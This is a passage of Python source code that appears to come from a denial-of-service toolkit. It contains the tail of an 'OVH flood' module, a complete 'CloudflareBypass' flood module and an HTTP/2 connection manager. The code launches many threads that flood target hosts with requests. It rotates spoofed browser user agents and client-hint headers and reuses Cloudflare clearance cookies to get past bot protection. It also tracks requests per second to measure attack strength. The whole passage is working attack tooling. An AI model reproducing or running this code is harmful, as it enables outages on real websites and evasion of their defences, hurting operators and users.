            self.protocol = Protocol.HTTP2 if HTTP2_AVAILABLE else Protocol.HTTP1
        
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Protocol: {self.protocol}")
        print(f"- Threads per target/port: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Path: {self.path}")
        
        if self.protocol == Protocol.HTTP2:
            print(f"- HTTP/2 Max Streams: {self.http2_max_streams}")
        
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for t in range(self.threads):
                    thread = threading.Thread(
                        target=self.flood_worker, 
                        args=(target, port, thread_count)
                    )
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                           prefix=f"Threads: {thread_count}/{total_threads}",
                                           length=30)
        
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = True
        self._monitor_thread.start()
        
        try:
            UI.print_info(f"Operation running for {self.duration} seconds (Press Ctrl+C to stop)")
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the OVH flood operation gracefully"""
        if not self.running:
            return
            
        UI.print_info("Stopping OVH flood operation...")
        
        self.running = False
        
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=1)
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping monitor thread: {e}")
        
        for thread in self.thread_list:
            try:
                thread.join(timeout=0.5)
            except Exception as e:
                if self.debug:
                    self.logger.debug(f"Error stopping thread: {e}")
        
        # Cleanup regular socket pools
        for pool in self.socket_pools:
            for key, sock in pool.items():
                try:
                    sock.close()
                except:
                    pass
            pool.clear()
        
        # Cleanup HTTP/2 connection pools
        for pool in self.http2_connection_pools:
            for key, (h2_conn, tls_sock) in pool.items():
                try:
                    h2_conn.close_connection()
                    tls_sock.sendall(h2_conn.data_to_send())
                    tls_sock.close()
                except:
                    pass
            pool.clear()
        
        # Cleanup HTTP/3 connection pools
        for pool in self.http3_connection_pools:
            for key, (h3_conn, quic_conn) in pool.items():
                try:
                    quic_conn.close()
                except:
                    pass
            pool.clear()
        
        self._print_final_stats()
        
        UI.print_success(f"OVH flood operation with {self.protocol} stopped successfully")


class CloudflareBypass(AttackModule):
    def __init__(self, targets: List[str], ports: List[int], duration: int = 60,
                 threads: int = 5, debug: bool = False, proxy_manager=None, 
                 skip_prompt: bool = False, path: str = '/'):
        super().__init__(targets, ports, skip_prompt)
        self.duration = duration
        self.threads = threads
        self.debug = debug
        self.proxy_manager = proxy_manager
        self.path = path
        
        # Initialize stats
        self.stats = {
            "packets_sent": 0,
            "bytes_sent": 0,
            "successful": 0,
            "failures": 0
        }
        self.stats_lock = threading.Lock()
        
        # Initialize logger
        self.logger = logging.getLogger(__name__)
        if debug:
            self.logger.setLevel(logging.DEBUG)
        else:
            self.logger.setLevel(logging.INFO)

        # Cloudflare bypass settings
        self.timeout = 5
        self.max_retries = 3
        self.connection_pool_size = 200
        self.verify_ssl = False
        
        # Updated headers for Cloudflare bypass
        self.headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
            # Modern browser headers - Sec-CH-UA family
            'Sec-CH-UA': '"Chromium";v="124", "Google Chrome";v="124"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-CH-UA-Platform-Version': '"15.0.0"',
            'Sec-CH-UA-Arch': '"x86"',
            'Sec-CH-UA-Bitness': '"64"',
            'Sec-CH-UA-Full-Version': '"124.0.6329.169"',
            # Device capability headers
            'Device-Memory': '8',
            'DPR': '2',
            'Viewport-Width': '1920',
            # Sec-Fetch headers
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        }
        
        # Performance monitoring
        self._monitor_thread = None
        self.perf_data = {
            "last_time": time.time(),
            "current_rps": 0,
            "highest_rps": 0,
            "total_requests": 0,
            "total_bytes": 0
        }
        
        # User agents list for rotation
        self.user_agents = [
            # Chrome for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            # Firefox for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            # Safari for macOS (latest versions)
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            # Edge for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
            # Opera for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112',
            # Vivaldi for Windows (latest versions)
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1',
            # Firefox for Linux (latest versions)
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            # Firefox for Android (latest versions)
            'Mozilla/5.0 (Android 11; Mobile; rv:90.0) Gecko/90.0 Firefox/90.0',
            'Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:90.0) Gecko/90.0 Firefox/90.0',
            # Safari for iOS (latest versions)
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        ]

        if debug:
            self.logger.setLevel(logging.DEBUG)
    
    def increment_stat(self, stat_name: str, value: int = 1):
        """Thread-safe increment of stats"""
        with self.stats_lock:
            self.stats[stat_name] += value
    
    def flood_worker(self, target: str, port: int):
        """Worker thread for Cloudflare bypass flooding"""
        import requests
        from requests.exceptions import RequestException
        
        # Setup session with optimized settings
        session = requests.Session()
        session.verify = self.verify_ssl
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.connection_pool_size,
            pool_maxsize=self.connection_pool_size,
            max_retries=self.max_retries,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Determine protocol
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{target}:{port}{self.path}"
        
        # Track cookies for Cloudflare bypass
        cf_cookies = {}
        
        while self.running:
            try:
                # Rotate user agent
                headers = self.headers.copy()
                headers['User-Agent'] = random.choice(self.user_agents)
                
                # Add timestamp to prevent caching
                params = {'_': int(time.time() * 1000)}
                
                # First request to get Cloudflare cookies
                response = session.get(
                    base_url,
                    headers=headers,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Store Cloudflare cookies
                if 'cf_clearance' in session.cookies:
                    cf_cookies = session.cookies.get_dict()
                
                # Calculate total bytes sent
                sent_bytes = len(str(headers)) + len(str(params))
                
                # Update stats
                self.increment_stat("successful")
                self.increment_stat("packets_sent")
                self.increment_stat("bytes_sent", sent_bytes + len(response.content))
                
                # If we got a Cloudflare challenge page, try to solve it
                if 'cf-browser-verification' in response.text or 'cf_chl_prog' in response.text:
                    # Wait a bit to simulate solving the challenge
                    time.sleep(random.uniform(3, 5))
                    
                    # Make a second request with the cookies
                    response = session.get(
                        base_url,
                        headers=headers,
                        params=params,
                        cookies=cf_cookies,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                    
                    # Update stats for second request
                    self.increment_stat("successful")
                    self.increment_stat("packets_sent")
                    self.increment_stat("bytes_sent", sent_bytes + len(response.content))
                
            except RequestException as e:
                self.increment_stat("failures")
                if self.debug:
                    self.logger.debug(f"Request failed: {str(e)}")
                time.sleep(0.5)
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Unexpected error: {str(e)}")
                time.sleep(0.5)
    
    def start(self):
        """Start Cloudflare bypass flood operation"""
        super().start()
        
        # Import check
        try:
            import requests
        except ImportError:
            UI.print_error("Please install required package: pip install requests")
            return
        
        UI.print_header("Cloudflare Bypass Flood Operation")
        UI.print_info(f"Starting Cloudflare bypass flood against {len(self.targets)} targets")
        
        # Configuration display
        print(f"\n{Style.BOLD}Configuration:{Style.RESET}")
        print(f"- Path: {self.path}")
        print(f"- Threads per target: {self.threads}")
        print(f"- Duration: {self.duration} seconds")
        print(f"- Connection pool size: {self.connection_pool_size}")
        
        # Launch worker threads
        total_threads = len(self.targets) * len(self.ports) * self.threads
        UI.print_info(f"Launching {total_threads} worker threads...")
        
        thread_count = 0
        for target in self.targets:
            for port in self.ports:
                for _ in range(self.threads):
                    thread = threading.Thread(target=self.flood_worker, args=(target, port))
                    thread.daemon = True
                    thread.start()
                    self.thread_list.append(thread)
                    thread_count += 1
                    
                    if thread_count % 10 == 0 or thread_count == total_threads:
                        UI.print_progress_bar(thread_count, total_threads,
                                         prefix=f"Threads: {thread_count}/{total_threads}",
                                         length=30)
        
        # Start performance monitoring
        self._monitor_thread = threading.Thread(target=self.monitor_performance)
        self._monitor_thread.daemon = False
        self._monitor_thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            UI.print_warning("Operation interrupted by user")
        finally:
            self.stop()
    
    def monitor_performance(self):
        """Monitor and display performance metrics"""
        last_update = time.time()
        last_stats = self.stats.copy()
        
        while self.running:
            try:
                time.sleep(1.0)
                current_time = time.time()
                elapsed = current_time - last_update
                
                if elapsed >= 1.0:
                    current_stats = self.stats.copy()
                    
                    # Calculate rates
                    rps = (current_stats["packets_sent"] - last_stats["packets_sent"]) / elapsed
                    bytes_sent = current_stats["bytes_sent"] - last_stats["bytes_sent"]
                    mbps = (bytes_sent * 8) / (1024 * 1024 * elapsed)
                    
                    # Update peak metrics
                    if rps > self.perf_data["highest_rps"]:
                        self.perf_data["highest_rps"] = rps
                    
                    # Update current metrics
                    self.perf_data["current_rps"] = rps
                    
                    # Calculate success rate
                    total_attempts = current_stats["successful"] + current_stats["failures"]
                    success_rate = int((current_stats["successful"] / total_attempts * 100) 
                                     if total_attempts > 0 else 0)
                    
                    # Format status line
                    timestamp = time.strftime("%H:%M:%S", time.localtime(current_time))
                    status_line = f"[{timestamp}] Target: {self.targets[0]} | Port: {self.ports[0]} | Method: CLOUDFLARE | RPS: {rps:.2f} | BPS: {mbps:.2f} MB | Success Rate: {success_rate}%"
                    
                    # Print status
                    print(status_line)
                    
                    # Update tracking values
                    last_stats = current_stats.copy()
                    last_update = current_time
                    
            except Exception as e:
                if self.debug:
                    self.logger.error(f"Error in performance monitoring: {e}")
                time.sleep(1)
    
    def stop(self):
        """Stop the Cloudflare bypass operation gracefully"""
        if not self.running:
            return
            
        self.running = False
        
        # Stop the monitor thread
        if self._monitor_thread and self._monitor_thread.is_alive():
            try:
                self._monitor_thread.join(timeout=2)
            except Exception:
                pass

        # Cleanup all threads
        for thread in self.thread_list:
            try:
                if thread.is_alive():
                    thread.join(timeout=1)
            except Exception:
                pass

        # Print final summary
        elapsed = time.time() - self.start_time
        rps = self.stats["packets_sent"] / elapsed if elapsed > 0 else 0
        mbps = (self.stats["bytes_sent"] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        UI.print_header("Operation Summary")
        print(f"- Duration: {elapsed:.2f} seconds")
        print(f"- Total requests: {self.stats['packets_sent']:,}")
        print(f"- Failed requests: {self.stats['failures']:,}")
        print(f"- Total data sent: {self.stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"- Average speed: {rps:.0f} requests/sec ({mbps:.2f} Mbps)")
        print(f"- Peak performance: {self.perf_data['highest_rps']:.0f} requests/sec")
        
        UI.print_success("Cloudflare bypass operation stopped successfully")


class HTTP2ConnectionManager:
    """
    HTTP/2 connection manager for effective multiplexing
    Handles stream lifecycle, prioritization, and connection pooling
    """
    def __init__(self, max_connections: int = 100, max_streams_per_connection: int = 100):
        self.max_connections = max_connections
        self.max_streams_per_connection = max_streams_per_connection
        self.connections = {}
        self.lock = threading.Lock()
    
    def get_connection(self, target: str, port: int) -> Tuple["h2.connection.H2Connection", ssl.SSLSocket]:
        """Get or create an HTTP/2 connection to the target"""
        key = f"{target}:{port}"
        with self.lock:
            if key not in self.connections or len(self.connections[key]) == 0:
                # Create new connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.settimeout(5)
                sock.connect((target, port))
                
                h2_conn, tls_sock = self._setup_http2_connection(sock)
                self.connections[key] = [(h2_conn, tls_sock)]
                
                return h2_conn, tls_sock
            
            # Reuse existing connection
            h2_conn, tls_sock = self.connections[key][-1]
            return h2_conn, tls_sock
    
    def _setup_http2_connection(self, sock: socket.socket) -> Tuple["h2.connection.H2Connection", ssl.SSLSocket]:
        """Set up HTTP/2 connection over the given socket"""
        if not HTTP2_AVAILABLE:
            raise ImportError("HTTP/2 support requires the h2 package: pip install h2")
            
        # Convert to TLS socket
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])
        tls_sock = context.wrap_socket(sock, server_hostname=sock.getpeername()[0])
        
        # Check if HTTP/2 was negotiated
        if tls_sock.selected_alpn_protocol() != 'h2':
            raise RuntimeError("Server doesn't support HTTP/2")
        
        # Create HTTP/2 connection
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        
        # Update settings
        settings = {
            h2.settings.INITIAL_WINDOW_SIZE: 65535,
            h2.settings.MAX_CONCURRENT_STREAMS: self.max_streams_per_connection,
            h2.settings.MAX_FRAME_SIZE: 16384
        }
        conn.update_settings(settings)
        
        # Send initial data
        tls_sock.sendall(conn.data_to_send())
        
        return conn, tls_sock
    
    def close_connection(self, target: str, port: int):
        """Close the HTTP/2 connection to the target"""
        key = f"{target}:{port}"
        with self.lock:
            if key in self.connections and len(self.connections[key]) > 0:
                h2_conn, tls_sock = self.connections[key].pop()
                try:
                    h2_conn.close_connection()
                    tls_sock.sendall(h2_conn.data_to_send())
                    tls_sock.close()
                except:
                    pass
    
    def close_all(self):
        """Close all managed connections"""
        with self.lock:
            for key in list(self.connections.keys()):
                self.close_connection(*key.split(":"))
